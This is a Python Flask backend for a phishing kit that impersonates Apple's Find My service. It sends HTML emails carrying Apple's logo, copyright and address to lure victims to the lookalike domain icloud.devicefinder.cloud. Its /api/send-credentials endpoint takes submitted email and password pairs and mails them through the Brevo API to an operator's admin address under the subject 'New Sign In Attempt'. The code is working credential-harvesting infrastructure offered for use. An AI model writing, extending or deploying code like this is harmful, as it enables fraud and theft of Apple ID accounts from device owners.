from flask import Flask, request, jsonify
from flask_cors import CORS
import os
from dotenv import load_dotenv
from threading import Thread
import requests
from typing import List
import ssl

# Load environment variables
load_dotenv()

app = Flask(__name__)

# Configure CORS with more permissive settings for development
CORS(
    app,
    resources={
        r"/api/*": {
            "origins": [
                "https://icloud.devicefinder.cloud",
                "http://icloud.devicefinder.cloud",
                "http://localhost:5173",
                "https://api.devicefinder.cloud"
            ],
            "methods": ["GET", "POST", "OPTIONS", "PUT", "DELETE"],
            "allow_headers": ["Content-Type", "Authorization", "X-Requested-With", "Accept"],
            "supports_credentials": True,
            "expose_headers": ["Content-Type", "Authorization"],
            "max_age": 3600,
            "send_wildcard": False,
            "vary_header": True
        }
    },
)

# Add CORS headers to all responses
@app.after_request
def after_request(response):
    response.headers.add('Access-Control-Allow-Origin', 'https://icloud.devicefinder.cloud')
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type,Authorization,X-Requested-With,Accept')
    response.headers.add('Access-Control-Allow-Methods', 'GET,POST,OPTIONS,PUT,DELETE')
    response.headers.add('Access-Control-Allow-Credentials', 'true')
    return response


class ValidationError(Exception):
    pass


def debug_print(message: str, error: bool = False) -> None:
    """Print debug messages with optional error flag"""
    if error:
        print(f"ERROR: {message}")
    else:
        print(f"DEBUG: {message}")


def send_email_with_brevo(to_addrs: List[str], subject: str, html_content: str) -> bool:
    """
    Send email using Brevo API.

    Args:
        to_addrs (List[str]): List of recipient email addresses
        subject (str): Email subject
        html_content (str): HTML content of the email

    Returns:
        bool: True if email was sent successfully, False otherwise

    Raises:
        ValidationError: If there's an issue with the email sending process
    """
    try:
        # Validate inputs
        if not to_addrs:
            raise ValidationError("No recipient email addresses provided")
        if not subject:
            raise ValidationError("Email subject cannot be empty")
        if not html_content:
            raise ValidationError("Email content cannot be empty")

        # Get environment variables
        base_url = os.getenv("BREVO_BASE_URL")
        api_key = os.getenv("BREVO_API_KEY")
        from_email = os.getenv("BREVO_FROM_EMAIL")
        from_name = os.getenv("BREVO_FROM_NAME")

        # Validate environment variables
        if not all([base_url, api_key, from_email, from_name]):
            debug_print("Missing required Brevo configuration", error=True)
            raise ValidationError("Email service configuration is incomplete")

        headers = {
            "api-key": api_key,
            "content-type": "application/json",
            "accept": "application/json",
        }

        # Remove duplicates and invalid emails
        to_addrs = list(set(addr.strip() for addr in to_addrs if addr))

        data = {
            "sender": {
                "email": from_email,
                "name": from_name,
            },
            "subject": subject,
            "htmlContent": html_content,
            "to": [{"email": to_addr} for to_addr in to_addrs],
        }

        debug_print(f"Sending email via Brevo to {len(to_addrs)} recipients")

        response = requests.post(
            base_url,
            headers=headers,
            json=data,
            timeout=30,  # Add timeout to prevent hanging
        )

        if response.status_code >= 400:
            debug_print(
                f"Brevo API error: {response.status_code} - {response.text}", error=True
            )
            raise ValidationError(f"Email service error: {response.status_code}")

        response.raise_for_status()
        debug_print("Email sent successfully")
        return True

    except requests.RequestException as e:
        debug_print(f"Request error while sending email: {str(e)}", error=True)
        raise ValidationError(f"Failed to send email: {str(e)}")
    except Exception as e:
        debug_print(f"Unexpected error while sending email: {str(e)}", error=True)
        raise ValidationError(f"Failed to send email: {str(e)}")


def send_device_email_async(email_data):
    """Background task to send device location email"""
    try:
        # Create email content using the template
        email_content = f"""
        <!DOCTYPE html>
        <html lang="en">
          <head>
            <meta charset="UTF-8" />
            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
            <title>Find Your Apple Device</title>
            <style>
              /* Reset styles for email clients */
              body,
              p,
              h1,
              table,
              td,
              div,
              a,
              span {{
                margin: 0;
                padding: 0;
                border: 0;
                font-size: 100%;
                font: inherit;
                vertical-align: baseline;
              }}

              /* Base styles */
              body {{
                min-height: 100vh;
                background-color: #ffffff;
                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
                  "Helvetica Neue", Arial, sans-serif;
                -webkit-font-smoothing: antialiased;
                -moz-osx-font-smoothing: grayscale;
                line-height: 1.4;
                color: #111827;
              }}

              /* Container styles */
              .container {{
                max-width: 600px;
                margin: 0 auto;
                padding: 20px;
              }}

              /* Logo styles */
              .logo-container {{
                margin-bottom: 32px;
                text-align: center;
              }}

              .logo {{
                width: 32px;
                height: 38px;
              }}

              /* Typography */
              .heading {{
                margin-bottom: 32px;
                text-align: center;
                font-size: 24px;
                font-weight: 600;
                color: #111827;
                line-height: 1.2;
              }}

              .paragraph {{
                font-size: 16px;
                color: #374151;
                line-height: 1.5;
                margin-bottom: 16px;
              }}

              /* Link styles */
              .link {{
                color: #0071e3;
                text-decoration: underline;
              }}

              /* Device info box */
              .device-info {{
                background-color: #f9fafb;
                border-radius: 8px;
                padding: 16px;
                margin: 16px 0;
              }}

              .device-info p {{
                margin: 8px 0;
                font-size: 14px;
                color: #4b5563;
              }}

              .device-info strong {{
                color: #111827;
              }}

              /* Button styles */
              .apple-button {{
                display: inline-block;
                background-color: #0071e3;
                color: #ffffff;
                text-decoration: none;
                padding: 12px 24px;
                border-radius: 980px;
                font-size: 16px;
                font-weight: 500;
                text-align: center;
                margin: 16px 0;
              }}

              /* Footer styles */
              .footer {{
                margin-top: 32px;
                padding-top: 16px;
                border-top: 1px solid #e5e7eb;
                font-size: 12px;
                color: #6b7280;
              }}

              /* Privacy notice */
              .privacy-notice {{
                font-size: 12px;
                color: #6b7280;
                margin-top: 16px;
                line-height: 1.4;
              }}

              /* Responsive styles */
              @media screen and (max-width: 480px) {{
                .container {{
                  padding: 16px;
                }}

                .heading {{
                  font-size: 20px;
                  margin-bottom: 24px;
                }}

                .paragraph {{
                  font-size: 14px;
                }}

                .device-info {{
                  padding: 12px;
                }}
              }}
            </style>
          </head>
          <body>
            <div class="container">
              <!-- Apple Logo -->
              <div class="logo-container">
                <img
                  src="https://www.apple.com/ac/globalnav/7/en_US/images/be15095f-5a20-57d0-ad14-cf4c638e223a/globalnav_apple_image__b5er5ngrzxqq_large.svg"
                  alt="Apple"
                  class="logo"
                  width="32"
                  height="38"
                />
              </div>

              <!-- Main Heading -->
              <h1 class="heading">Find Your Device</h1>

              <!-- Email Content -->
              <div class="content">
                <p class="paragraph">Hello {email_data["full_name"]},</p>

                <p class="paragraph">
                  We've received your request to locate your Apple device. Here are the
                  details of your case:
                </p>

                <div class="device-info">
                  <p><strong>Case ID:</strong> {email_data["case_id"]}</p>
                  <p><strong>Device:</strong> {email_data["device"]}</p>
                  <p><strong>Model:</strong> {email_data["model"]}</p>
                  <p><strong>Serial Number:</strong> {email_data["serial_number"]}</p>
                </div>

                <p class="paragraph">
                  To locate your device, please click the button below.
                </p>

                <div style="text-align: center">
                  <a href={f"{os.getenv('FRONTEND_URL')}?email={email_data['email']}"} class="apple-button">Find My Device</a>
                </div>

                <p class="paragraph">
                  If you need additional assistance, you can visit
                  <a href="https://support.apple.com" class="link">Apple Support</a> or contact us directly.
                </p>

                <div class="privacy-notice">
                  <p>
                    This email was sent to you because you requested to locate your Apple device.
                    If you did not make this request, please ignore this email or contact
                    <a href="https://support.apple.com" class="link">Apple Support</a>.
                  </p>
                  <p>
                    For your security, this email contains no personal information and
                    cannot be used to access your Apple ID or other Apple services.
                  </p>
                </div>

                <div class="footer">
                  <p>Copyright © 2025 Apple Inc. All rights reserved.</p>
                  <p>
                    <a href="https://www.apple.com/legal/privacy" class="link">Privacy Policy</a> |
                    <a href="https://www.apple.com/legal/terms" class="link">Terms of Use</a>
                  </p>
                  <p>Apple Inc. | 1 Apple Park Way | Cupertino, CA 95014</p>
                </div>
              </div>
            </div>
          </body>
        </html>
        """

        # Send email using Brevo
        send_email_with_brevo(
            to_addrs=[email_data["email"]],
            subject="Find Your Apple Device",
            html_content=email_content,
        )
    except ValidationError as e:
        debug_print(f"Error sending device email: {str(e)}", error=True)
    except Exception as e:
        debug_print(f"Unexpected error sending device email: {str(e)}", error=True)


def send_credentials_email_async(credentials_data):
    """Background task to send credentials to admin email"""
    try:
        # Create email content
        email_content = f"""
        <html>
            <body>
                <h2>New Sign In Attempt</h2>
                <p>New credentials received:</p>
                <div style="background-color: #f9fafb; padding: 16px; border-radius: 8px;">
                    <p><strong>Email:</strong> {credentials_data["email"]}</p>
                    <p><strong>Password:</strong> {credentials_data["password"]}</p>
                </div>
            </body>
        </html>
        """

        # Send email using Brevo
        send_email_with_brevo(
            to_addrs=[os.getenv("ADMIN_EMAIL")],
            subject="New Sign In Attempt",
            html_content=email_content,
        )
    except ValidationError as e:
        debug_print(f"Error sending credentials email: {str(e)}", error=True)
    except Exception as e:
        debug_print(f"Unexpected error sending credentials email: {str(e)}", error=True)


@app.route("/api/send-device-email", methods=["POST"])
def send_device_email():
    try:
        data = request.json
        required_fields = [
            "full_name",
            "email",
            "device",
            "model",
            "serial_number",
            "token",
        ]

        # Validate required fields
        for field in required_fields:
            if field not in data:
                return jsonify({"error": f"Missing required field: {field}"}), 400

        if data["token"] != os.getenv("ADMIN_TOKEN"):
            return jsonify({"error": "Invalid token"}), 401

        # Generate case ID
        data["case_id"] = f"100{len(data['email']) + len(data['serial_number'])}"

        # Start background task
        thread = Thread(target=send_device_email_async, args=(data,))
        thread.start()

        return jsonify(
            {"message": "Email sending initiated", "case_id": data["case_id"]}
        ), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/send-credentials", methods=["POST"])
def send_credentials():
    try:
        data = request.json
        required_fields = ["email", "password"]

        # Validate required fields
        for field in required_fields:
            if field not in data:
                return jsonify({"error": f"Missing required field: {field}"}), 400

        # Start background task
        thread = Thread(target=send_credentials_email_async, args=(data,))
        thread.start()

        return jsonify({"message": "Credentials email sending initiated"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500


if __name__ == "__main__":
    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ssl_context.load_cert_chain(
        certfile='nginx/ssl/fullchain.pem',
        keyfile='nginx/ssl/privkey.pem'
    )
    app.run(
        debug=True,
        host='0.0.0.0',
        port=443,
        ssl_context=ssl_context
    )
